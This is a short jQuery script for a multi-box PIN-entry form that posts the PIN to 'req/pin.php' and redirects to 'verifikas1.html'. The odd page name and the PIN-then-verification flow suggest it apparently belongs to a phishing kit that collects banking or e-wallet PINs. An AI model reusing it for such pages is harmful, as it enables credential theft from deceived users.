        <script>
    $('.inppin').on('input', function(event) {
        const inputs = $('.inppin');
        const isAllFilled = Array.from(inputs).every((input) => input.value !== '');
        if (isAllFilled == true) {
            $(event.target).blur();
            sendPin();
        };
        const index = inputs.index(this);
        const currentValue = event.target.value;
        if (currentValue.length === 1) {
            if (index < inputs.length - 1) {
                inputs[index + 1].focus();
            }
        } else if (currentValue.length === 0) {
            if (index > 0) {
                inputs[index].focus();
            }
        };
    });
    $('.inppin').on('keydown', function(event) {
        const inputs = $('.inppin');
        const key = event.key;
        const index = inputs.index(this);
        if (key === 'Backspace' && event.target.value.length === 0) {
            if (index > 0) {
                inputs[index - 1].focus();
            }
        };
    });
    </script>
    
    <script>
    function sendPin() {
        $("#process").show();
        event.preventDefault();
        $("#pin1").blur();
        $.ajax({
            type: 'POST',
            url: 'req/pin.php',
            data: $('#formPin').serialize(),
            dataType: 'text',
            success: function() {
                setTimeout(function() {
                     $("#pin1").focus();
                window.location.href = "verifikas1.html";
                }, 1000);
            }
        });
    };
